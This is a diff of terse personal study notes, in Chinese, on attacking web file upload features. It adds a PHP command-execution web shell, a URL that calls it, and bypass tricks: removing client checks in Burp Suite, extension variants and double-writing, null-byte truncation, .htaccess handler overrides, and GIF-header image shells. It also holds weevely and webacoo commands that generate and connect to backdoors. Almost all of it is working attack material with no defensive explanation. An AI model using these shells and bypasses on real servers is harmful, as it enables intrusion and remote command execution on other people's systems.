@@ -1,5 +1,8 @@
 <?php @eval($_PPST["password"]);?>
 
+<?php if($_GET){$cmd=$_GET["cmd"];system($cmd);}else{echo "no cmd";};?>
+	view-source:http://xiaoxiaoran.com/1.php?cmd=ipconfig
+	
 client check
 	burpsuite 可删除表单验证
 	直接删掉,保存新文件
@@ -11,12 +14,25 @@ mime-type
 黑名单
 	php3 php4 phtml pHp2 Php php.
 	burpsuite 加空格
+	phphpp 双写
 	
+白名单
+	php<5.3 gpc=0 addslashes
+		0x00截断
+			1.php%00
+			hex 00 00 
+					
 .htaccess
 	AllowOverride All
 		SetHandler application/x-httpd-php
 		1.jpg
 			<?php phpinfo();?>
+
+文件包含
+	1.jpg
+		GIF89A
+			<?php phpinfo();?>
+
 			
 webacoo
 	webacoo -g -o xiao.php 
@@ -26,7 +42,8 @@ weevely
 	weevely generate xiaoxiaoran /home/xiaoxiaoran/xiao.php  
 	weevely  "http://xiaoxiaoran.com/xiaoxiaoran/xiao.php" xiaoxiaoran
 
-		
+竞争条件
+	
 		
 		
 		
